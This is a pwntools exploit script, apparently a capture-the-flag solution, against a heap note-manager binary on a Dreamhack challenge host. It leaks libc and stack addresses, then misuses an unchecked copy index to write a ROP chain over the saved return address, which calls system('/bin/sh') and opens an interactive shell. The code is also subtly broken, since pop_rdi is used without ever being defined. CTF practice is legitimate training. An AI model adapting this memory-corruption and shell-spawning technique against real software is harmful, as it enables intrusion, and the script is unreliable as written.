#!/usr/bin/python3
from pwn import * 

exe = ELF('./prob_patched', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
context.binary  = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		brva 0x000000000000127A
		brva 0x0000000000001322
		brva 0x0000000000001439
		brva 0x0000000000001445
		brva 0x00000000000015EB
		brva 0x00000000000017C5
		brva 0x00000000000015CE
		c
		''')

if args.REMOTE:
	HOST = 'host8.dreamhack.games'
	PORT = 18376
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def make_note(idx, size,info):
	slan(b'>> ', 1)
	slan(b'>> ', idx)
	slan(b'>> ', size)
	sa(b'>> ', info)
def copy_note(idx_src, idx_dist):
	slan(b'>> ', 2)
	slan(b'>> ', idx_src)
	slan(b'>> ', idx_dist)
def remove(idx):
	slan(b'>> ', 3)
	slan(b'>> ', idx)
def change_username(name):
	slan(b'>> ', 4)
	sa(b'>> ', name)

#GDB()
#input()
sa(b'name?\n', b'A')
libc.address = leak(r(6), 0x1f0f41)
info("Libc Base: ", libc.address)

change_username(b'A' * 0x20)
ru(b'A' * 0x20)
saved_rip = leak(r(6), 0xe8)
info("Saved rip: ", saved_rip)

make_note(1, 12, b'A')
make_note(2, 12, b'A')

remove(1)	
remove(2)

make_note(1, 0x50, p64(pop_rdi))
make_note(2, 0x18, p32(5) + p32(0x100) + p64(saved_rip))
copy_note(1, 5)

make_note(6, 0x20, p64(next(libc.search(b'/bin/sh'))))
make_note(7, 0x20, b'A' * 8 + p64(saved_rip + 0x8))
input("2")
copy_note(7, 2)
copy_note(6, 0x41414141)

make_note(8, 0x20, p64(pop_rdi + 1))
make_note(9, 0x20, b'A' * 8 + p64(saved_rip + 0x10))
input("3")
copy_note(9, 2)
copy_note(8, 0x41414141)

make_note(10, 0x20, p64(libc.sym.system))
make_note(11, 0x20, b'A' * 8 + p64(saved_rip + 0x18))
input("4")
copy_note(11, 2)
copy_note(10, 0x41414141)

sla(b'>> ', b'5')

p.interactive()

